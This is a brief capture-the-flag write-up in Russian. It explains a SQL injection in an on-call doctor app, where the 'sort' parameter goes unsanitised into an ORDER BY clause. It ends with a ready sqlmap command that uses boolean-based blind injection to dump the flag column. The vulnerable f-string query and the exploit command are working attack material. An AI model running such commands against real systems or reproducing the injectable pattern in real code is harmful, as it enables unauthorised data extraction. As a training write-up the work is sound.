
Основная логика приложения находится в файле `app.py`

Эндпоинт `/api/on-call` принимает GET-параметр `sort` и передаёт его в функцию `select_on_call`

```python
if request.path == "/api/on-call":
    parameters = parse_qs(request.query, keep_blank_values=True)
    order_expression = parameters.get("sort", ["name"])[0]
    if not order_expression or len(order_expression) > 600:
        self.send_json(400, {"error": "Invalid schedule preference."})
        return
    try:
        doctor = select_on_call(order_expression)
    except (sqlite3.Error, LookupError):
        # Query errors deliberately do not expose database details.
        self.send_json(400, {"error": "The on-call board could not be updated."})
        return
    self.send_json(200, {"doctor": doctor})
    return
```


**Уязвимый участок кода:**

Внутри функции `select_on_call` значение подставляется прямо в SQL-запрос через f-строку. Параметр `order_expression` попадает в `ORDER BY`, что приводит к SQL-инъекции

```python
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
```

Из-за данного условия приложение на любую ошибку  отдаёт одинаковый код `400`, необходимо использовать boolean-based blind технику


**Решение:**


```bash
sqlmap -u "https://doctor-bye-bye-e6606dc54978.inst8.ctf.fortid.com/api/on-call?sort=name" -p sort --technique=B --dbms=sqlite --prefix="CASE WHEN (" --suffix=") THEN id ELSE -id END" --not-string="Dr. Ada Pulse"  -T doctors -C farewell_note --dump --batch
```




